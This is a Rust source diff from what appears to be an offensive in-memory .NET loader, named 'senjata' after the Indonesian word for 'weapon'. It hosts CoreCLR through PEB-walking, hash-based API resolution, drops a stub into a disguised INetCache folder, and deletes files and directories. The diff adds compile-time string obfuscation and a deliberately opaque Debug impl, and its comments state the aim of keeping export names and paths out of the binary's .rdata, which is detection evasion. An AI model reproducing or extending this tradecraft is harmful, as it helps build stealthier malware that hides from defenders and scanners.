@@ -7,17 +7,40 @@ use alloc::vec::Vec;
 use core::ffi::c_void;
 use opsec_bootstrap::Bootstrap;
 use opsec_peb::{resolve_export, resolve_module};
-use opsec_strcrypt::{hash, obf};
+use opsec_strcrypt::{hash, obf, obfw};
 
 use crate::discovery::{build_tpa_list, find_dotnet_root, find_highest_runtime};
 use crate::stub_artifact::StubArtifact;
+
+/// Discriminant for `Error::ExportNotFound` — avoids embedding plaintext
+/// export names in `.rdata` while still providing diagnostic granularity.
+/// `Debug` is implemented manually to suppress variant-name string literals
+/// that the derive macro would otherwise embed.
+pub enum CoreExport {
+    CoreClrInitialize,
+    CoreClrCreateDelegate,
+    CoreClrShutdown2,
+    KernelBase,
+    LoadLibraryW,
+    GetEnvironmentVariableW,
+    DeleteFileW,
+    RemoveDirectoryW,
+    GetModuleFileNameA,
+}
+
+impl core::fmt::Debug for CoreExport {
+    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
+        // Intentionally opaque — variant names must not appear in .rdata.
+        f.write_str("export")
+    }
+}
 
 #[derive(Debug)]
 pub enum Error {
     DotnetRootNotFound,
     RuntimeNotFound,
     CoreClrLoadFailed,
-    ExportNotFound(&'static str),
+    ExportNotFound(CoreExport),
     StubDropFailed,
     InitFailed(i32),
     CreateDelegateFailed(i32),
@@ -57,9 +80,19 @@ pub unsafe fn run(
         let dotnet_root = find_dotnet_root(&bs).ok_or(Error::DotnetRootNotFound)?;
         let runtime_ver = find_highest_runtime(&bs, &dotnet_root)
             .ok_or(Error::RuntimeNotFound)?;
-        let runtime_dir = format!("{}\\shared\\Microsoft.NETCore.App\\{}",
-                                  dotnet_root, runtime_ver);
-        let coreclr_path = format!("{}\\coreclr.dll", runtime_dir);
+        let nca_sep = obf!("\\shared\\Microsoft.NETCore.App\\");
+        let runtime_dir = format!(
+            "{}{}{}",
+            dotnet_root,
+            core::str::from_utf8(nca_sep.as_bytes()).unwrap_or(""),
+            runtime_ver,
+        );
+        let coreclr_suffix = obf!("\\coreclr.dll");
+        let coreclr_path = format!(
+            "{}{}",
+            runtime_dir,
+            core::str::from_utf8(coreclr_suffix.as_bytes()).unwrap_or(""),
+        );
 
         // 2. Load coreclr.dll via PEB-walk + kernelbase.LoadLibraryW
         load_coreclr(&coreclr_path)?;
@@ -81,11 +114,11 @@ pub unsafe fn run(
 
         // 5. Resolve coreclr exports
         let init_addr = resolve_export(coreclr, hash!("coreclr_initialize"))
-            .ok_or(Error::ExportNotFound("coreclr_initialize"))?;
+            .ok_or(Error::ExportNotFound(CoreExport::CoreClrInitialize))?;
         let cd_addr = resolve_export(coreclr, hash!("coreclr_create_delegate"))
-            .ok_or(Error::ExportNotFound("coreclr_create_delegate"))?;
+            .ok_or(Error::ExportNotFound(CoreExport::CoreClrCreateDelegate))?;
         let sd_addr = resolve_export(coreclr, hash!("coreclr_shutdown_2"))
-            .ok_or(Error::ExportNotFound("coreclr_shutdown_2"))?;
+            .ok_or(Error::ExportNotFound(CoreExport::CoreClrShutdown2))?;
 
         type InitFn = unsafe extern "system" fn(
             *const u8, *const u8, i32,
@@ -217,9 +250,9 @@ unsafe fn load_coreclr(coreclr_path: &str) -> Result<(), Error> {
             return Ok(());
         }
         let kbase = resolve_module(hash!("kernelbase.dll"))
-            .ok_or(Error::ExportNotFound("kernelbase.dll"))?;
+            .ok_or(Error::ExportNotFound(CoreExport::KernelBase))?;
         let ll = resolve_export(kbase, hash!("LoadLibraryW"))
-            .ok_or(Error::ExportNotFound("LoadLibraryW"))?;
+            .ok_or(Error::ExportNotFound(CoreExport::LoadLibraryW))?;
         type Fn = unsafe extern "system" fn(*const u16) -> *mut c_void;
         let f: Fn = core::mem::transmute::<*const (), Fn>(ll);
         let mut path_w: Vec<u16> = coreclr_path.encode_utf16().collect();
@@ -236,8 +269,18 @@ unsafe fn load_coreclr(coreclr_path: &str) -> Result<(), Error> {
 fn build_drop_root_dos() -> String {
     // %LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.MSO
     let lad = unsafe { read_env_local_appdata() }
-        .unwrap_or_else(|| String::from("C:\\Users\\Public"));
-    format!("{}\\Microsoft\\Windows\\INetCache\\Content.MSO", lad)
+        .unwrap_or_else(|| {
+            let fb = obf!("C:\\Users\\Public");
+            core::str::from_utf8(fb.as_bytes())
+                .unwrap_or("")
+                .into()
+        });
+    let mso_suffix = obf!("\\Microsoft\\Windows\\INetCache\\Content.MSO");
+    format!(
+        "{}{}",
+        lad,
+        core::str::from_utf8(mso_suffix.as_bytes()).unwrap_or(""),
+    )
 }
 
 unsafe fn read_env_local_appdata() -> Option<String> {
@@ -246,7 +289,9 @@ unsafe fn read_env_local_appdata() -> Option<String> {
         let getenv = resolve_export(kbase, hash!("GetEnvironmentVariableW"))?;
         type Fn = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
         let f: Fn = core::mem::transmute::<*const (), Fn>(getenv);
-        let name: Vec<u16> = "LOCALAPPDATA\0".encode_utf16().collect();
+        let env_name = obfw!("LOCALAPPDATA");
+        let mut name: Vec<u16> = env_name.as_wide().to_vec();
+        name.push(0);
         let mut buf = [0u16; 512];
         let n = f(name.as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
         if n == 0 || (n as usize) >= buf.len() { return None; }
@@ -255,9 +300,11 @@ unsafe fn read_env_local_appdata() -> Option<String> {
 }
 
 fn current_module_ansi() -> Vec<u8> {
-    // Best-effort; if anything fails, use "senjata" as a placeholder.
+    // Best-effort; if anything fails, use "senjata.exe" as a placeholder.
     // CoreCLR uses this only for diagnostic strings.
-    let mut v = b"senjata.exe\0".to_vec();
+    let placeholder = obf!("senjata.exe");
+    let mut v: Vec<u8> = placeholder.as_bytes().to_vec();
+    v.push(0);
     unsafe {
         if let Some(kbase) = resolve_module(hash!("kernelbase.dll")) {
             if let Some(gmf) = resolve_export(kbase, hash!("GetModuleFileNameA")) {
